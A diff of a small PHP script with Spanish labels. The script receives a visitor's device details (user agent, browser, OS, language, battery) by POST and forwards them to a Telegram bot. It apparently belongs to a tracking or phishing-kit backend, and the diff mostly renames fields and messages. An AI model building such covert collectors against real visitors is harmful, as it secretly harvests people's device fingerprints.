@@ -1,21 +1,22 @@
 <?php
 require_once __DIR__ . '/telegram.php';
 
-$user_agent = $_POST['agent'] ?? 'N/A';
+$user_agent = $_POST['agent'] ?? 'Desconocido';
 $navigator  = $_POST['navegador'] ?? 'N/A';
 $versionapp = $_POST['versionapp'] ?? 'N/A';
-$distro     = $_POST['distro'] ?? 'N/A';
+$dystro     = $_POST['dystro'] ?? 'N/A';
 $lenguaje   = $_POST['idioma'] ?? 'N/A';
-$bateria    = $_POST['bateria'] ?? 'N/A';
+$bateri     = $_POST['bateri'] ?? 'N/A';
 
-$msg = "📊 <b>Datos del dispositivo</b>\n".
-       "🖥 User-Agent: $user_agent\n".
+$msg = "📊 <b>Nueva info recibida</b>\n".
+       "🖥️ User-Agent: $user_agent\n".
        "🌐 Navegador: $navigator\n".
-       "🔢 Versión: $versionapp\n".
-       "💻 Sistema: $distro\n".
-       "🗣 Idioma: $lenguaje\n".
-       "🔋 Batería: $bateria%";
+       "📦 Versión App: $versionapp\n".
+       "💻 Sistema: $dystro\n".
+       "🗣️ Idioma: $lenguaje\n".
+       "🔋 Batería: $bateri%";
 
 send_to_telegram($msg);
 
-echo json_encode(['status' => 'ok']);
+echo json_encode(["ok" => true]);
+?>
